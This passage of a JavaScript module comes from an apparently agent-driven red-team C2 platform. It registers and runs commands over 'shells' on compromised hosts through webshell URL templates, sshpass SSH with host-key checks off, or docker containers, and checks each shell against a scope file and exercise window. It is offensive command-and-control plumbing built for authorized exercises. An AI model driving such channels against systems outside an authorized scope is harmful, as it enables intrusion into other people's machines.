/**
 * Shell registry — C2 implant handles as first-class citizens.
 *
 * A "shell" = an operational channel to a compromised host produced by the
 * C2 agent (implant QA-passed + acceptance-stamped). Registered here with
 * its transport; the operator console and stage agents (persistence/postex)
 * execute through it — one transport, three consumers:
 *   1. Frontend terminal (operator types commands, SSH-like)
 *   2. `shell` agent tool (exec/read_file handed to persistence/postex)
 *   3. C2 agent itself (delivery bookkeeping)
 *
 * Authorization: every shell is bound to an authorized target + exercise
 * window (HVV scope file). exec() refuses outside scope — same hard gate
 * as c2-qa.py (exit discipline) but enforced server-side.
 *
 * Transports: 'local'(基准/开发: 命令跑指定沙箱容器) / 'web'({CMD} 模板
 * URL) / 'ssh'(user:pass@host)——CS23-N14: 'plug in later' 失实(web/ssh
 * 已实现, register 校验即在三枚举内)。
 */
import { randomUUID } from 'node:crypto';
import { sandboxConfig } from './sandbox/container.mjs';
import { mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { dirname as pdirname, join as pathJoin } from 'node:path';
import { execFile } from 'node:child_process';


function parseFormBody(tpl) {
  // "a=1&c={CMD}" → replace {CMD} already done; split into pairs
  const out = {};
  for (const kv of String(tpl).split('&')) {
    const [k, v = ''] = kv.split('=');
    out[decodeURIComponent(k)] = decodeURIComponent(v);
  }
  return out;
}

/** shells by id — persisted to disk on every mutation; replayed on boot. */
const shells = new Map();
// P0-A(五审): 跟随数据目录——此前硬编码生产路径, 隔离实例写穿到
// /var/lib/spectre/tools/c2/shells.json(跨实例状态互渗, 实测发生)。
const SHELL_SNAPSHOT = pathJoin(
  process.env.SPECTRE_DATA_DIR ?? '/var/lib/spectre', 'tools/c2/shells.json');

/** 自测-7: 沙箱容器重建后, 依赖容器进程态的通道全部失效——标记 dead
 * 并持久化(注册表保留作审计, exec 时如实拒绝而非静默超时)。
 * @returns {number} 被标记的通道数 */
export function markTransportDead() {
  let n = 0;
  for (const sh of shells.values()) {
    // 仅 local(容器内执行)依赖沙箱容器; web/ssh 是外部通道不受影响
    if (sh.status === 'active' && sh.transport === 'local') {
      sh.status = 'dead-sandbox-recreated'; n++;
    }
  }
  if (n) persistShells();
  return n;
}

function persistShells() {
  try {
    mkdirSync(pdirname(SHELL_SNAPSHOT), { recursive: true });
    writeFileSync(SHELL_SNAPSHOT, JSON.stringify([...shells.values()]));
  } catch { /* best-effort; bus audit is the source of truth */ }
}

function loadShells() {
  try {
    const arr = JSON.parse(readFileSync(SHELL_SNAPSHOT, 'utf8'));
    for (const sh of arr) shells.set(sh.id, sh);
    return arr.length;
  } catch { return 0; }
}
// Boot-time replay (restores across runtime restarts)
loadShells();

const MAX_OUT = 64 * 1024;

/** transportRef "user:pass@host[:port]" — CS1-R6: 三处逐字正则收敛。 */
const SSH_REF_RE = /^(.+?):(.*?)@([^:]+)(?::(\d+))?$/;
/** Second-resolution UTC timestamp — CS1-R6: 两处逐字收敛。 */
const isoNow = () => new Date().toISOString().slice(0, 19) + 'Z';

/**
 * Normalize child-process output into the bounded exec result shape
 * (CS1-R7: ssh/local 两分支逐字后处理收敛)。timeout/截断注记由
 * `timeoutNote` 区分远端/容器措辞。
 */
function boundedExecResult(err, so, se, timeoutNote, runtimeTool) {
  const stdout = String(so ?? '');
  let stderr = String(se ?? '');
  const code = err ? (err.code ?? 1) : 0;
  if (code === 124 || code === 137) stderr += `\n${timeoutNote}`;
  if (err?.killed) stderr += '\n[timeout]';
  // R32D87-A/CS71-2: ENOENT 具名根因按分支传入的 runtimeTool(local
  // 分支='docker 容器', ssh 分支='sshpass')——此前共用提示把 sshpass
  // 缺失误报为 docker, 且"均经沙箱容器"与本文件头注相反。
  if (err?.code === 'ENOENT' && runtimeTool) {
    stderr += `\n[根因: ${runtimeTool} 不可用——该传输依赖其在宿主 PATH; 未装时换可用传输或用宿主 CLI 工具面]`;
  }
  if (err?.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER') {
    stderr += `\n[输出超 ${MAX_OUT}B 截断——管道 head/tail/grep 缩小范围后重取]`;
  }
  // loop39-P1: maxBuffer 截断同样标注(ssh/local 通道)。
  if (stdout && stdout.length >= MAX_OUT) {
    stdout += `\n[已达单次输出上限 ${MAX_OUT}B——如需更多用 head/tail 分段]`;
  }
  return { stdout, stderr, code };
}

/** CS21-1/CS22-F4: shell 审计载荷 → Bus 白名单字段映射适配器。
 * 生产(agent-runtime)与机锁(shell-bus.test)共用本导出——此前测试内
 * 近逐字副本使映射本体回归时机锁仍绿(P0 级修复落在机锁射程外)。
 * summary=kind·shell·target·命令摘要(检索面), detail=JSON 全量(证据面)。 */
export function shellBusAdapter(bus) {
  return {
    emit: (type, payload) => bus.emit({
      type,
      channel: 'c2',
      from: 'shells',
      summary: [payload?.kind, payload?.id, payload?.target,
        String(payload?.cmd ?? '').slice(0, 80)].filter(Boolean).join(' · ').slice(0, 500),
      detail: JSON.stringify(payload),
    }),
  };
}

/** CS26-2/CS27-1/7: scope targets 匹配器(模块级单源)——精确串 |
 * '*.domain' 通配; 大小写不敏感(DNS 语义)。shell.target 是主机名,
 * SKILL 'targets' 清单里的网段不参与 shell 匹配。
 * gate 标签门与 exec 目的地校验共用; 导出供机锁直接断言。 */
export function targetMatches(t, target) {
  const tt = String(t).toLowerCase(), dt = String(target).toLowerCase();
  // loop-auth-场景3: 主机前缀语义——scope 条目 127.0.0.1 覆盖其任意
  // 端口形态(127.0.0.1:30080); 一次授权全端口放行, 否则每端口都要
  // 批一次(7852 案: 批了裸 IP 仍被带端口条目拦, 授权问题反复污染)。
  const stripPort = x => x.replace(/:\d{1,5}$/, '');
  // loop-auth-7896: localhost 与 127.0.0.1 同机等价(席位按域名形态
  // 注册曾再被拦——授权问题反复污染的最后一个变体)。
  const norm = x => { const h = stripPort(x); return h === 'localhost' ? '127.0.0.1' : h; };
  return tt === dt
    || (tt.startsWith('*.') && dt.endsWith(tt.slice(1)))
    || (norm(tt) === norm(dt) && !norm(tt).includes('*'));
}

export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 死参数删(仅 persistShells 快照持久化)
  const audit = (kind, data) => {
    try { bus?.emit?.('shell-event', { kind, at: new Date().toISOString(), ...data }); } catch { /* bus optional */ }
  };

  function gate(shell) {
    // Server-side authorization: exercise window + target binding.
    const sc = listScope?.() ?? null;
    // R32D85-E2: 缺件指路(与 CLI SCOPE-REJECT 同格)——此前只报
    // '配置缺失' 不给路径/三必填, 注册能过 exec 才卡, 用户两跳才明。
    if (!sc) return { ok: false, error: 'scope 不可读:期望 tools/c2/scope.json(targets/exercise/window 三必填; 容器位 /opt/tools/c2/, 宿主位 $SPECTRE_DATA_DIR/tools/c2/)' };
    const now = isoNow();
    const inWindow = sc.window && sc.window.start <= now && now <= sc.window.end;
    // R32D50-F8/CS27-7: targets 语义=模块级 targetMatches(详见其 doc 注释)。
    const inTargets = Array.isArray(sc.targets)
      && sc.targets.some(t => targetMatches(t, shell.target));
    if (!sc.targets?.length || !inWindow) return { ok: false, error: '授权门:窗口外或无目标(拒绝)' };
    if (!inTargets) return { ok: false, error: `授权门:目标 ${shell.target} 不在清单(拒绝)。target 只写目标名(如 127.0.0.1), 不带端口——端口属于 transportRef` };
    if (shell.expiresAt && now > shell.expiresAt) {
      // R6-F3: 过期是事实终态——懒翻 status 让查重/list 反映真值
      // (此前僵尸 status=active 永久占名, 卡死同名重注册)。
      shell.status = 'expired';
      try { persistShells(); } catch { /* audit 已留痕 */ }
      return { ok: false, error: 'shell 已过期(一次性纪律)' };
    }
    // R6-F1: target 是自由文本标签, 与流量实际目的地零绑定——此前
    // 注册 target=授权名即可把 transportRef 指向任意内网地址(实测
    // 打穿 runtime 自身 /api/health)。推导 web/ssh 的目的地主机并
    // 要求 ∈ targets(targetMatches: 精确|'*.domain' 通配——裸目标不吃
    // 点后缀子域, CS27-5 语义收窄披露); local=平台自有沙箱不校验。
    if (shell.transport === 'web' || shell.transport === 'ssh') {
      const dest = destinationHost(shell);
      if (dest) {
        const ok = (sc.targets || []).some(t => targetMatches(t, dest));
        if (!ok) {
          return { ok: false, error:
            `授权门:通道目的地 ${dest} 不在目标清单(拒绝)——target 标签与 transportRef 端点不一致。目标确需渗透时: 调用 request_authorization(target, 理由) 向用户申请授权, 批准后自动放行` };
        }
      }
    }
    return { ok: true };
  }

  /** R6-F1: 从 transportRef 推导流量实际目的地主机。 */
  function destinationHost(shell) {
    const tr = String(shell.transportRef || '');
    try {
      if (shell.transport === 'web') {
        const [spec0raw] = tr.split('#');
        // r35-N2b: 同款 GET 前缀剥离(授权门 host 提取曾误析)
        const spec0 = /^GET[ |]/i.test(spec0raw) ? spec0raw.replace(/^GET[ |]/i, '') : spec0raw;
        const tpl = spec0.startsWith('POST|') ? spec0.slice(5) : spec0;
        const urlPart = tpl.split('|')[0];
        return new URL(urlPart).hostname;
      }
      if (shell.transport === 'ssh') {
        const m = SSH_REF_RE.exec(tr);
        return m ? m[3] : null;
      }
    } catch { return null; }
    return null;
  }

  function register({ name, target, transport = 'web', transportRef = '', note = '', tags = [], createdBy = 'operator', ttlHours = 24, meta = {} }) {  // CS24-F4: 缺省统一 'web'(routes/tools 同口径)
    const id = 'sh-' + randomUUID().slice(0, 8);
    // 命名规范:<目标>-<面>-<权限> 建议(不强制,但重名/空名拒)
    const nm = String(name || '').trim();
    if (!nm) return { error: 'name 必填(建议格式 目标-面-权限,如 dc8-web-www)' };
    // r25-①: target 带端口(:数字结尾)注册即拒——此前 exec 才拒, 通道
    // 以 active 僵尸态滞留(校验时点不一致)
    if (/:[0-9]+$/.test(String(target || '').trim())) {
      return { error: `target ${target} 带端口——target 只写目标名(如 127.0.0.1), 端口属于 transportRef(如 http://host:port/…)` };
    }
    // R6-F3: 过期通道不占名(事实终态, gate 已拒执行)
    const nowIso = isoNow();
    if ([...shells.values()].some(x => x.name === nm && x.status === 'active'
        && !(x.expiresAt && x.expiresAt <= nowIso)))
      return { error: `同名活跃通道已存在: ${nm}(先 close 或换名)` };
    // transportRef 格式校验(register 时拦截,不留到 exec 才爆)
    const tr = String(transportRef || '');
    // r38-P2: target 标签本身也早校验(local 通道无 transportRef 目的
    // 地, 此前 local 注册完全绕过 scope, exec 才拦——晚失败实测)。
    {
      const sc0 = listScope?.() ?? null;
      const t0 = String(target || '').trim();
      if (sc0?.targets?.length && t0
        && !sc0.targets.some(t => targetMatches(t, t0))) {
        return { error: `授权门:target ${t0} 不在 scope 清单,拒绝注册(早校验)。示例:${sc0.targets.slice(0, 3).join('/')}。确需渗透: request_authorization(${t0}, 理由) 申请授权` };
      }
    }
    // r17-1: 注册路径 scope 硬校验(web/ssh 目的地必须在授权清单——
    // 此前仅 exec 门校验, evil.example.com 可注册成功(r17 实证))。
    if (transport === 'web' || transport === 'ssh') {
      const sc0 = listScope?.() ?? null;
      const dest0 = destinationHost({ transport, transportRef: tr });
      const ok0 = sc0 && dest0 && Array.isArray(sc0.targets)
        && sc0.targets.some(t => targetMatches(t, dest0));
      if (!ok0) {
        return { error: `授权门:目标 ${dest0 ?? tr.slice(0, 40)} 不在 scope 清单,拒绝注册。示例:${(sc0?.targets ?? []).slice(0, 3).join('/') || '(未配置)'}。确需渗透: request_authorization(该目标, 理由) 申请授权` };
      }
    }
    if (transport === 'web') {
      if (!tr.includes('{CMD}'))
        return { error: 'web transportRef 需含 {CMD} 占位(如 http://h/p.php?c={CMD}#MARK);自定义头加 "H: 名称: 值" 段(POST 用 | 分隔,GET 用空格)' };
      // r6v2-观测12: 注册预验与执行解析同规(此前 GET|前缀注册不拒、
      // 执行才爆)。全段跑一遍: POST 段形态/GET 禁 |/头段合法。
      // r35-N2b: GET 显式前缀先剥(与 exec 解析同规)——register 预验
      // 曾拒 "GET http://…" 形态, 复测一活一死的红灯根因。
      let spec0 = tr.split('#')[0].replace(/\s+$/, '');
      const hadGetPrefix = /^GET[ |]/i.test(spec0);
      if (hadGetPrefix) spec0 = spec0.replace(/^GET[ |]/i, '');
      if (!spec0.startsWith('POST|') && spec0.includes('|'))
        return { error: 'GET 形态不含 "|"(检测到 GET| 前缀误写——POST 才用 | 分隔)' };
      const headerRe = /^\s*H:\s*([!#$%&'*+.^`|~0-9A-Za-z-]+):\s*(.*)$/;
      if (spec0.startsWith('POST|')) {
        const parts = spec0.slice(5).split('|');
        for (const part of parts.slice(1)) {
          if (!headerRe.test(part) && !part.includes('{CMD}'))
            return { error: `POST 段无法识别(${part.slice(0, 40)})——段须含 {CMD} 或形如 "H: 名称: 值"` };
        }
      } else {
        for (const seg of spec0.split(/\s+(?=H:\s)/).slice(1)) {
          if (!headerRe.test(seg.trim()))
            return { error: `GET 头段无法识别(${seg.slice(0, 40)})——形如 "H: 名称: 值", 空格分隔` };
        }
      }
    }
    if (transport === 'ssh' && !SSH_REF_RE.test(tr))
      return { error: 'ssh transportRef 需 user:pass@host[:port]' };
    if (transport === 'local' && !tr)
      return { error: 'local transportRef 需 容器名[:用户] (如 pxlab:www-data)' };
    const sh = {
      id, name: name || id, target, transport, transportRef, note,
      tags: Array.isArray(tags) ? tags.slice(0, 8).map(String) : [],
      createdBy, createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + ttlHours * 3600e3).toISOString(),
      workSessionId: meta?.workSessionId ?? null,  // r50: 项目归属(控制台按项目过滤)
      cmdCount: 0, lastActiveAt: null, status: 'active',
      tasks: [],          // tasking history (Mythic): {n, command, code, ms, at}
      host: null, user: null, os: null,  // auto-fingerprint (Sliver session meta)
    };
    shells.set(id, sh); persistShells();
    audit('shell-register', { id, target, transport, createdBy, name: nm });
    // 自测r2-#5: register 回执显式标注沙箱驱动形态(local=命令跑宿主,
    // 无容器隔离; docker 未装/未用时不再静默)。#7 同批: local 驱动无
    // "容器重建"事件语义(文件丢失与平台无关, 无 bus 通知)。
    const drv = sandboxConfig().driver;
    if (drv === 'local') sh.driverNote =
      'sandbox=local(宿主直跑, 无容器隔离; docker 未启用——需隔离请装 docker 并重跑 deploy/setup.sh)';
    return sh;
  }

  const listNow = () => new Date().toISOString();
  function list(f = {}) {
    // r14-②: 过期懒翻到 list 面(gate 已懒翻——list 此前仍显 active,
    // r13 候选建议采纳)
    const now = listNow();
    for (const sh of shells.values()) {
      if (sh.status === 'active' && sh.expiresAt && sh.expiresAt <= now) {
        sh.status = 'expired';
        try { persistShells(); } catch { /* best-effort */ }
      }
    }
    // r19-3: 死靶回收——过期超 1h 的通道从注册表移除(bus 审计链永久
    // 留痕, 注册表只是视图; 48h 阈值会让终验空等十余小时——审计语义
    // 下 1h 足够)。
    const gcCut = Date.now() - 1 * 3600e3;
    let gc = 0;
    for (const [id, sh] of shells) {
      if (sh.status === 'expired' && sh.expiresAt && Date.parse(sh.expiresAt) < gcCut) {
        shells.delete(id); gc += 1;
      }
    }
    if (gc) { persistShells(); audit('shell-gc', { removed: gc }); }
    let out = [...shells.values()];
    if (f.target) out = out.filter(x => x.target === f.target);
    if (f.transport) out = out.filter(x => x.transport === String(f.transport).toLowerCase());  // CS26-8/CS27-6: 与 agent 入口(tools.mjs)归一同口径
    if (f.tag) out = out.filter(x => (x.tags ?? []).includes(f.tag));
    if (f.name) out = out.filter(x => String(x.name).toLowerCase().includes(String(f.name).toLowerCase()));
    if (f.status) out = out.filter(x => x.status === f.status);
    return out;
  }

  function get(id) {
    const sh = shells.get(id) ?? null;
    // r27-D2': 计算态过期——status 单查此前返回陈旧 active(惰性翻标
    // 只挂 list, 实测同一秒 list 前 active/list 后 expired)
    if (sh && sh.status === 'active' && sh.expiresAt
        && sh.expiresAt <= new Date().toISOString()) {
      sh.status = 'expired';
      try { persistShells(); } catch { /* best-effort */ }
    }
    return sh;
  }

  function close(id) {
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    // loop21-②: 幂等重放区分——重复 close 此前逐字相同(状态机正确但
    // 回执不可区分), 附 closedAt+alreadyClosed 使两次回执可辨。
    if (sh.status === 'closed') {
      return { ok: true, alreadyClosed: true, closedAt: sh.closedAt ?? null };
    }
    sh.status = 'closed';
    sh.closedAt = new Date().toISOString();
    persistShells();
    audit('shell-close', { id });
    return { ok: true, closedAt: sh.closedAt };
  }

  /**
   * Execute one command over the shell. Transport 'local' = run inside the
   * configured exec box (docker container) — benchmark-grade fidelity.
   * Returns { ok, stdout, stderr, code, ms }.
   */
  // loop39-P0: 共享 web 通道并发串台——8990 桥共享 stdout, 并发调用
  // 命令交错注入互相收到对方输出(postex↔persistence md5 交叉实证)。
  // per-shell 串行队列: 同 shell 的 exec 排队执行, 消除交错窗。
  const shellLocks = new Map();

  async function exec(id, command, opts = {}) {
    const prev = shellLocks.get(id) ?? Promise.resolve();
    let release;
    const gate = new Promise(r => { release = r; });
    const chained = prev.then(() => gate);
    shellLocks.set(id, chained);
    await prev.catch(() => {});
    try {
      return await execRaw(id, command, opts);
    } finally {
      release();
      if (shellLocks.get(id) === chained) shellLocks.delete(id);
    }
  }

  async function execRaw(id, command, opts = {}) {
    let { timeoutMs = 30_000, verifyMark = false } = opts;  // CS71-5: box 死参删(零调用方, 同类 wal 已按 CS20-11 删)
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    if (sh.status !== 'active') return { ok: false, error: `shell 状态 ${sh.status}——dead/expired 通道不会自动重探, 端点若已恢复请 register 重新注册(同 target 新 id), 历史命令记录仍可查` };
    const g = gate(sh);
    if (!g.ok) {
      // R32D50-F5/CS35-5: shell 授权门拒绝落本侧 audit(与 c2 工具的
      // 审计纪律对齐——c2 侧仅正常操作+qa 的 EDUSRC 拒绝落行, 见
      // scope-gate SKILL 审计表)。
      audit('shell-gate-reject', { id, target: sh.target, reason: g.error });
      return { ok: false, error: g.error };
    }
    const t0 = Date.now();
    let stdout = '', stderr = '', code = 0;
    let degradedNote;  // r9v2-D10回归: 提升到函数顶
    let layerNote;  // r38-P1: web 通道 code 语义注记(local 分支内声明曾致 web/ssh 路径引用未定义——exec 全瘫)
    try {
      if (sh.transport === 'ssh') {
        // transportRef: "user:pass@host:port" — VM range channel (post-creds).
        const m = SSH_REF_RE.exec(sh.transportRef || '');
        if (!m) return { ok: false, error: 'ssh transportRef 需 user:pass@host[:port]' };
        const [, u, pw, h, port] = m;
        const r = await new Promise((resolve) => {
          const tSecS = Math.max(1, Math.ceil(timeoutMs / 1000));
          // r28-#1: 单层 shell。r33-D1: 数组参数经 ssh 在远端被空格拼接,
          // $()/$? 落到 bash -lc 引号外被外层 shell 展开——read_file 的
          // 命令替换产物成为外层赋值, bash 实际执行字面量"o"(恒空)。
          // 修复: remote command 合成单参数并 shell-quote 整体包裹。
          const rq = "'" + command.replace(/'/g, `'\\''`) + "'";
          // r35-N6: LogLevel=ERROR 消 stderr 的 known_hosts 噪声(每发
          // 一条 Warning, 覆盖真实错误线索)
          execFile('sshpass', ['-p', pw, 'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-o', 'LogLevel=ERROR', '-p', port || '22',
            `${u}@${h}`, `timeout -k 5 ${tSecS} bash -lc ${rq}`],
            { timeout: timeoutMs, maxBuffer: MAX_OUT }, (err, so, se) =>
            resolve({ err, so: String(so ?? ''), se: String(se ?? ''), code: err ? (err.code ?? 1) : 0 }));
        });
        ({ stdout, stderr, code } = boundedExecResult(
          r.err, r.so, r.se, '[timeout: 远端进程已被 timeout(1) 终止]', 'sshpass(ssh 传输宿主侧依赖)'));
      } else if (sh.transport === 'web' && verifyMark) {
        // loop37-D2: 一拍滞后自愈(8990 桥端点实证 stdout=上一条命令
        // 输出)。包装唯一 nonce 定界, 响应不含本条 nonce=读到旧输出,
        // 自动重发一次; 仍不含则原样返回+滞后警告。
        const nonce = `WM${Date.now().toString(36)}`;
        const wrapped = `printf '${nonce}S'; ${command}; printf '${nonce}E'`;
        const runOnce = async () => execRaw(id, wrapped, { timeoutMs });  // loop39: 锁内递归用 raw(死锁防护)
        let r1 = await runOnce();
        const grab = txt => {
          const a = txt.indexOf(nonce + 'S'); const b = txt.indexOf(nonce + 'E');
          return (a >= 0 && b > a) ? txt.slice(a + nonce.length + 1, b) : null;
        };
        const core = grab(String(r1.stdout ?? ''));
        if (core != null) {
          return { ...r1, stdout: core, note: 'verifyMark:回显 nonce 自洽(本条输出)' };
        }
        const r2 = await runOnce();
        const core2 = grab(String(r2.stdout ?? ''));
        if (core2 != null) {
          return { ...r2, stdout: core2,
            note: 'verifyMark:首次回显为旧输出(一拍滞后), 已自动重发取本条输出' };
        }
        return { ...r2,
          note: 'verifyMark:两次回显均不含本条 nonce——端点可能不支持 printf 包装(白名单类)或深度粘滞; 输出未经验证, 勿直接用于决策(双发规避见 seq=7311)' };
      } else if (sh.transport === 'web') {
        // transportRef: full URL template with {CMD} placeholder, e.g.
        //   http://h/p.php?c={CMD}        (GET; CMD urlencoded)
        //   POST|http://h/p.php|c={CMD}   (POST body form-encoded)
        // Optional response delimiters after '#' as marker: ...{CMD}#MARK
        // — only text between <MARK> and </MARK> is returned (kills the
        // Joomla/WordPress page-prefix noise that caused two misreads).
        const spec = sh.transportRef || '';
        const [spec0raw, markerRaw] = spec.split('#');
        // r9v2-D4: marker 兼容带尖括号写法(#<R6OUT> 等价 #R6OUT——
        // 剥壳查 '<R6OUT>' 时 '<'+'<R6OUT>'+'>' 永不命中)
        const marker = markerRaw ? markerRaw.replace(/^<+|>+$/g, '') : markerRaw;
        // r6-#3: {CMD} 与 #MARK 之间的尾随空白不进请求(击碎精确白名单)
        const spec0 = spec0raw.replace(/\s+$/, '');
        // r35-N2: "GET " 前缀形态兼容——agent 常把 GET 写成显式前缀,
        // 此前整段当 URL 使授权门 host 误析+拒绝文案截断(#W 半截)。
        const isPost = spec0.startsWith('POST|') || spec0.startsWith('POST ');
        let spec0n = spec0;
        if (!isPost && /^GET[ |]/i.test(spec0)) spec0n = spec0.replace(/^GET[ |]/i, '');
        const tpl = isPost ? spec0.slice(5) : spec0n;
        // F26: POST 模板形如 "url|c={CMD}" —— url 与 form 段用 | 分隔;
        // 此前整段 tpl 当 fetch url 且 parseFormBody 吃进完整 URL 导致
        // 命令字段丢失(实测 post-ok: 空)。拆开:url 部分 fetch,form 部分
        // 做 body。无 | 时 form 段缺省 c={CMD}。
        const postSplit = isPost ? tpl.split('|') : [];
        const postUrl = isPost ? (postSplit[0] || tpl) : tpl;
        // r6-#1/#2: 附加头语法——段形如 "H: 名称: 值"(POST 第 5 段起/
        // GET 无 | 时 #MARK 前 " H: …" 空格分隔段)。此前第 4 段被静默
        // 并入 body; 现显式解析, 非法段报错不再吞。
        const extraHeaders = {};
        const headerRe = /^\s*H:\s*([!#$%&'*+.^`|~0-9A-Za-z-]+):\s*(.*)$/;
        let postForm = '';
        if (isPost) {
          const formParts = postSplit.slice(1);
          const stray = [];
          for (const part of formParts) {
            const hm = headerRe.exec(part);
            if (hm) extraHeaders[hm[1]] = hm[2].trim();
            else stray.push(part);
          }
          if (stray.length > 1) {
            return { ok: false, error: `transportRef 第 4+ 段无法识别(${stray.slice(1).join('|').slice(0, 60)})——自定义头请用 "H: 名称: 值" 段` };
          }
          postForm = stray.join('|') || 'c={CMD}';
        } else {
          // GET 形态: "...{CMD} H: K: v H: K2: v2#MARK" 空格分隔头段
          const segs = tpl.split(/\s+(?=H:\s)/);
          for (const seg of segs.slice(1)) {
            const hm = headerRe.exec(seg.trim());
            if (hm) extraHeaders[hm[1]] = hm[2].trim();
          }
          if (segs.length > 1) {
            // 剥离头段后重设 url 模板
            sh._urlTpl = segs[0];
          }
        }
        if (!tpl.includes('{CMD}')) return { ok: false, error: 'web transportRef 需含 {CMD} 占位' };
        const enc = encodeURIComponent(command);
        const urlTpl = (!isPost && sh._urlTpl) ? sh._urlTpl : (isPost ? postUrl : tpl);
        const url = isPost ? postUrl : urlTpl.replace('{CMD}', enc);
        const body = isPost ? postForm.replace('{CMD}', enc) : null;
        const ctl = new AbortController();
        // 自测-6: 上限裁剪显式化——此前静默钳 60s, 调用方传大值无效且回执
        // 不注明, 报告方以为超时参数生效。裁剪发生时在结果附 cappedAt。
        const effTimeout = Math.min(timeoutMs, 60_000);
        const t = setTimeout(() => ctl.abort(), effTimeout); // hard kill
        const cappedAt = timeoutMs > 60_000 ? 60000 : undefined;
        try {
          const r = await fetch(url, {
            method: isPost ? 'POST' : 'GET',
            body: isPost ? new URLSearchParams(parseFormBody(body)) : undefined,
            headers: {
              ...(isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {}),
              ...extraHeaders,
            },
            signal: ctl.signal,
          });
          let txt = await r.text();
          clearTimeout(t);
          if (marker) {
            // r37-O5: 定界形态扩展——部分 webshell 回显用井号行(#WS-START/
            // #WS-END)而非角括号标签, 此前剥壳不匹配原样透传(sh-869f64cf
            // 实证, 样本包 seq=5687)。命中次序: 角括号对 → #M…#M(重复)
            // → #M-START…#M-END(START 后缀惯例)。
            let m1 = txt.indexOf('<' + marker + '>');
            let m2 = txt.indexOf('</' + marker + '>');
            let tagLen = marker.length + 2;  // '<MARK>' 形态缺省
            if (m1 < 0) {
              const hashStart = txt.indexOf('#' + marker);
              if (hashStart >= 0) {
                const endSame = txt.indexOf('#' + marker, hashStart + marker.length + 1);
                const endSuffixed = txt.indexOf('#' + marker.replace(/START$/i, 'END'));
                // 取两者中更近的合法终点
                const cands = [endSame, endSuffixed].filter(x => x > hashStart);
                if (cands.length) {
                  m1 = hashStart; tagLen = marker.length + 1;  // '#MARK' 形态
                  m2 = Math.min(...cands);
                }
              }
            }
            if (m1 >= 0) {
              txt = m2 > m1 ? txt.slice(m1 + tagLen, m2) : txt.slice(m1 + tagLen);
              // r8-D4: 残余开/闭包装标签一并剥净(stdout 不再回显标签)
              const safe = marker.replace(/[^\w]/g, ch => '\\' + ch);
              txt = txt.replace(new RegExp('</?' + safe + '>', 'g'), '').replace(/^\n+/, '');  // r8v4 足注: 标签位前导换行一并清
            }
          }
          // loop39-P1: 静默截断→显式标注(已显示/总长+补全手段)。
          stdout = txt.length > MAX_OUT
            ? txt.slice(0, MAX_OUT) + `\n[已截断:${MAX_OUT}/${txt.length} 字符——head/tail/grep 缩小范围后重取]`
            : txt;
          stderr = ''; code = r.ok ? 0 : 1;
          // r38-P1: web 回执 code=HTTP 传输层(200→0), 不反映端点命令
          // 退出码——dash 内层失败静默曾致假成功误导实战决策。载荷需
          // 自带回显(如 `; echo rc=$?`)才有真实 rc。
          layerNote = 'code=传输层(HTTP), 非端点命令 rc——需载荷回显 rc=$? 判定命令成败';
          if (cappedAt) stdout += `\n(timeoutMs 已按 web 通道上限裁剪为 ${cappedAt}ms)`;
        } catch (e) {
          clearTimeout(t);
          // r35-N1: undici 真实错误在 e.cause(message 恒 fetch failed)——
          // 与 tooling D6b 同款分类, web 通道探针曾只回通用文案。
          const c = e?.cause;
          const msg = String(c?.code ?? c?.message ?? e?.message ?? e ?? '');
          const why = /ENOTFOUND|getaddrinfo/i.test(msg) ? '域名解析失败(host 不存在或无外联 DNS)'
            : /ETIMEDOUT|timeout|aborted/i.test(msg) ? '连接超时(目标无响应或被墙)'
            : /certificate|SSL|TLS|wrong version number/i.test(msg) ? 'TLS 握手失败(协议不匹配或证书问题)'
            : /ECONNREFUSED/i.test(msg) ? '连接被拒(端口未开)'
            : msg || '未知网络错误';
          const capNote = cappedAt
            ? `(timeoutMs 超出 web 通道上限, 已按 ${cappedAt}ms 硬杀)` : '';
          return { ok: false, error: `webshell 通道异常:${why}${capNote}。目标 ${String(url).slice(0, 100)}` };
        }
      } else if (sh.transport === 'local') {
        // transportRef binds the shell to ONE exec box — commands land in
        // the compromised box, never the runtime host. Format "container"
        // (default user) or "container:user" (low-priv web compromise).
        // CS20-2: 容器名单源(同 mcp.mjs)——字面量回退仅 legacy 持久化
        // 数据可达, 但同样绕过命名空间契约。
        const ref = sh.transportRef || sandboxConfig().container;
        const [cbox, cuser] = ref.includes(':') ? ref.split(':') : [ref, null];
        // F18: 容器侧 timeout(1) 包裹——node 杀 docker CLI 不杀容器进程
        // (泄漏 bash+sleep),且 docker CLI 被 SIGTERM 后 err 为空导致超时
        // 谎报 code:0 ok:true。容器内 timeout 真杀进程并返回 124。
        const tSec = Math.max(1, Math.ceil(timeoutMs / 1000));
        // r6-#5: docker 缺席时降级宿主 sh(不再 ENOENT 裸崩)——回执注明
        // 降级形态(容器语义丢失: 无 cuser 隔离/无容器 FS)。
        const haveDocker = sandboxConfig().driver === 'docker';
        let res;
        if (haveDocker) {
          const argv = cuser
            ? ['exec', '-u', cuser, cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command]
            : ['exec', cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command];
          res = await new Promise((resolve) => {
            execFile('docker', argv, { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
              resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
          });
          ({ stdout, stderr, code } = boundedExecResult(
            res.err, res.so, res.se, '[timeout: 容器内进程已被 timeout(1) 终止]', 'docker(local 传输经沙箱容器执行)'));
        } else {
          // r8-D1(真修, 前批虚报勘误): 单层 shell——外层 bash -lc 再包一层
          // 时 $o/$X 被外层提前展开(赋值丢失, printf 输出字面 "$o",
          // read_file 恒空 content)。timeout 直执行 bash, 引号由 execFile
          // 数组参数天然隔离。落盘以 /tmp/probe.mjs 四用例实证为准。
          res = await new Promise((resolve) => {
            execFile('timeout', ['-k', '5', String(tSec), 'bash', '-c', command],  // r9-D5: 去 -l 消 profile 噪声
              { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
              resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
          });
          ({ stdout, stderr, code } = boundedExecResult(
